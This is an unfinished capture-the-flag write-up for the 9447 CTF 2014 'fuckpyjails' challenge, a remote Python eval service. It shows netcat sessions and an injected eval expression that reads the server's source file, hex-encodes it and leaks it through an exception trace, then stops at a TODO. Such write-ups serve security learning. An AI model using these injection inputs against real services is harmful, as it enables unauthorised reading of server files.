# 9447 CTF 2014: fuckpyjails

**Category:** Exploitation
**Points:** 150
**Solves:** 30
**Description:**

> Remote Code Execution As A Service
>
> fuckpyjails.9447.plumbing:9447
>
> **Hint!** key == flag

## Write-up

```bash
$ nc fuckpyjails.9447.plumbing 9447
>>> 1+1
Fail!

$ nc fuckpyjails.9447.plumbing 9447
>>> x
Traceback (most recent call last):
  File "/home/ctf/fuckpyjails.py", line 18, in <module>
    if get_key() is eval(raw_input()):
  File "<string>", line 1, in <module>
NameError: name 'x' is not defined
```

It seems our input is evaluated. Its result is then compared to the return value of the `get\_key()` function. Any exceptions are displayed along with a stack trace; the line on which the error occurs is printed as well. Let’s try to view the source code for this challenge located at `/home/ctf/fuckpyjails.py`:

```bash
$ nc fuckpyjails.9447.plumbing 9447
>>> open('/home/ctf/fuckpyjails.py').read()
Fail!
```

This fails because `open('/home/ctf/fuckpyjails.py').read()` evaluates to a string that is not equal to the expected key. How can we get the string to be printed, though? Just trigger an error or exception of some sort, keeping in mind only a single line of code is printed at a time:

```bash
$ nc fuckpyjails.9447.plumbing 9447
>>> eval(open('/home/ctf/fuckpyjails.py').read().encode('hex'))
Traceback (most recent call last):
  File "/home/ctf/fuckpyjails.py", line 18, in <module>
    if get_key() is eval(raw_input()):
  File "<string>", line 1, in <module>
  File "<string>", line 1
    23212f7573722f62696e2f656e7620707974686f6e0a696d706f7274207379730a696d706f727420736f636b65740a696d706f7274207265736f757263650a0a7265736f757263652e736574726c696d6974287265736f757263652e524c494d49545f4e50524f432c2028302c203029290a0a646566206765745f6b657928293a0a0973203d20736f636b65742e736f636b657428736f636b65742e41465f554e49582c20736f636b65742e534f434b5f53545245414d290a09732e636f6e6e65637428222f6b657973657276657222290a0972203d20732e72656376283634290a09732e636c6f736528290a0972657475726e20720a0a7379732e7374646f75742e777269746528223e3e3e2022290a7379732e7374646f75742e666c75736828290a0a6966206765745f6b65792829206973206576616c287261775f696e7075742829293a0a097072696e74202244696420796f752067657420746865206b65793f220a656c73653a0a097072696e7420224661696c21220a

SyntaxError: unexpected EOF while parsing
```

This gives us the hex-encoded version of the challenge’s source code. Let’s decode it and save it as [`fuckpyjails.py`](fuckpyjails.py):

```bash
$ xxd -r -p <<< '23212f7573722f62696e2f656e7620707974686f6e0a696d706f7274207379730a696d706f727420736f636b65740a696d706f7274207265736f757263650a0a7265736f757263652e736574726c696d6974287265736f757263652e524c494d49545f4e50524f432c2028302c203029290a0a646566206765745f6b657928293a0a0973203d20736f636b65742e736f636b657428736f636b65742e41465f554e49582c20736f636b65742e534f434b5f53545245414d290a09732e636f6e6e65637428222f6b657973657276657222290a0972203d20732e72656376283634290a09732e636c6f736528290a0972657475726e20720a0a7379732e7374646f75742e777269746528223e3e3e2022290a7379732e7374646f75742e666c75736828290a0a6966206765745f6b65792829206973206576616c287261775f696e7075742829293a0a097072696e74202244696420796f752067657420746865206b65793f220a656c73653a0a097072696e7420224661696c21220a' > fuckpyjails.py
```

(TODO)

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-9447-fuckpyjails/>
* <http://blog.germano.io/2014/fuckpyjails-writeup-9447-ctf/>
* <https://github.com/pwning/public-writeup/blob/master/9447ctf2014/exploitation/fuckpyjails/fuckpyjails.txt>
